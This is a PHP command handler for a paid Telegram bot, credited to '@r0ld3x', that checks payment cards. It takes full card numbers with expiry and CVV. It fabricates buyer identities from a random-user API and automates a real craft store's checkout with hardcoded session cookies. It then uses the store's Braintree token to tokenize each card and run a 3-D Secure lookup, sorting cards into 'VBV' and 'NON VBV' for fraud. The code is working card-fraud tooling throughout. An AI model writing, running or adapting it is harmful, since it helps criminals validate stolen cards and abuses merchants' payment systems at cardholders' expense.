<?php
if(strpos($message, '!vbv') === 0 or strpos($message, '/vbv') === 0 or strpos($message, '.vbv') === 0){
// if ($gId != '1317173146'){
// reply_to($chatId,$message_id,$keyboard,$maintain);
// exit();
// }
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
    $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
$current = time();
$sec = $current - $times;
if($role == 'MEMBER' and $sec < 20)
{
 $after = 20 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <i> TRY AGAIN AFTER $after sec.</i></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}elseif($role == 'USER' and $sec < 120)
{
 $after = 120 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <i> TRY AGAIN AFTER $after sec.</i></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}elseif(empty($role)){
 reply_to($chatId,$message_id,$keyboard,$noregister);
 exit();
}
sendaction($chatId, typing);
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($cvv)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
 }
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
    // 
    // $ip = array(
  // 1 => 'socks5://p.webshare.io:1080',
  // 2 => 'http://p.webshare.io:80',
    // );
    // $socks = array_rand($ip);
    // $socks5 = $ip[$socks];

edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

#------[SETP-1]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step1/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: buddlycrafts.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_gat_gtag_UA_1050488_1=1;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334906.0;_ga=GA1.1.1027250232.1629334834';
$headers[] = 'referer: https://buddlycrafts.com/checkout/step1/';
$headers[] = 'origin: https://buddlycrafts.com';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'');
$get = curl_exec($ch);

//MERCHANT ID
$hid = trim(strip_tags(getStr($get, '/checkout/step2/','/')));
// exit();
#------[GET-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step2/'.$hid.'/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
// curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: buddlycrafts.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
$headers[] = 'referer: https://buddlycrafts.com/checkout/step1/';
$headers[] = 'origin: https://buddlycrafts.com';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get = curl_exec($ch);
#------[SETP-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step2/'.$hid.'/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: buddlycrafts.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
$headers[] = 'referer: https://buddlycrafts.com/checkout/step2/'.$hid.'/';
$headers[] = 'origin: https://buddlycrafts.com';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'country=US&name='.$first.'+'.$laat.'&line1=3+Allen+Street&line2=&town_or_city=New+York&us_state=NY&county_or_state=NY&postal_code=10002&phone=2253688965');
$get = curl_exec($ch);

#------[GET-3]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step3/'.$hid.'/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
// curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: buddlycrafts.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
$headers[] = 'referer: https://buddlycrafts.com/checkout/step2/'.$hid.'/';
$headers[] = 'origin: https://buddlycrafts.com';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'country=US&name=Carolyn+watson&line1=3+Allen+Street&line2=&town_or_city=New+York&us_state=NY&county_or_state=NY&postal_code=10002&phone=2253688965');
$get = curl_exec($ch);

//MERCHANT ID
// $hid = trim(strip_tags(getStr($get, '/checkout/step2/','/')));

// echo "<hr> <pre> STEP3 $get <pre> <hr>";
// exit();

#------[SETP-3]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step3/'.$hid.'/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
// curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: buddlycrafts.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
$headers[] = 'referer: https://buddlycrafts.com/checkout/step3/'.$hid.'/';
$headers[] = 'origin: https://buddlycrafts.com';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=braintree');
$get = curl_exec($ch);

//MERCHANT ID
// $hid = trim(strip_tags(getStr($get, '/checkout/step2/','/')));
// echo "<hr> <pre> STEP3 $get <pre> <hr>";
// exit();

// exit();
#------[CURL-1]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step4/'.$hid.'/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
$headers[] = 'referer: https://buddlycrafts.com/checkout/step3/'.$hid.'/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$get = curl_exec($ch);

//MERCHANT ID
$merchant = trim(strip_tags(getStr($get, '"merchant_id": "','"')));

// ENCODED BEARER
$enbearer = trim(strip_tags(getstr($get, '"client_token": "','"')));


// DECODED BEARER
$decode = base64_decode($enbearer);

// MAIN BEARER
$bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"','",')));
echo "<hr> <pre> Bearer $bearer <pre> <hr>";
echo "<hr> <pre> merchant $merchant <pre> <hr>";
// exit();

#------[CURL-2]------#
// exit();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://buddlycrafts.com';
$headers[] = 'Referer: https://buddlycrafts.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$session.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"Issac Newton"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl2 = curl_exec($ch);
$token = trim(strip_tags(getstr($curl2, '"token":"','"')));
curl_close($ch);
echo "<hr> <pre> token $token <pre> <hr>";

#------[CURL-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/'.$merchant.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'Origin: https://buddlycrafts.com';
$headers[] = 'Referer: https://buddlycrafts.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"34.14","additionalInfo":{"shippingGivenName":"Issac","shippingSurname":"Newton","shippingPhone":"7018560000","billingLine1":"1427  Harrison Street","billingLine2":"","billingCity":"San Rafael","billingState":"CA","billingPostalCode":"94903","billingCountryCode":"US","billingPhoneNumber":"7018560000","billingGivenName":"Issac","billingSurname":"Newton","shippingLine1":"1427  Harrison Street","shippingLine2":"","shippingCity":"San Rafael","shippingState":"CA","shippingPostalCode":"94903","shippingCountryCode":"US","email":"issacnewton@gmail.com"},"bin":"'.$bin.'","dfReferenceId":"0_1a30c2ca-9949-49be-be53-655f498b5e2d","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.68.0","cardinalDeviceDataCollectionTimeElapsed":867,"issuerDeviceDataCollectionTimeElapsed":1347,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.68.0","_meta":{"merchantAppId":"buddlycrafts.com","platform":"web","sdkVersion":"3.68.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$session.'"}}');
$lookup = curl_exec($ch);
$status = trim(strip_tags(getstr($lookup, '"status":"','"')));
$enrolled = trim(strip_tags(getstr($lookup, '"enrolled":"','"')));
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if($status == "authenticate_attempt_successful" or $status == "lookup_not_enrolled"){
  $cc_code = "✅";
  $code = 'NON VBV';
}elseif(!strpos($lookup, "authenticate_attempt_successful") ){

$cc_code = '❌';
  $code = 'VBV';
}

if(empty($lookup) or strpos($lookup, 'Credit card number is invalid')){
$result = urlencode("<b>
GATE --> <i> BRAINTREE VBV LOOKUP </i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Give Me A Valid Card ❌
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);
$result = urlencode("<b>
GATE --> <i> BRAINTREE VBV LOOKUP </i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> $code-$cc_code
Status ->> ${status} - $enrolled
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>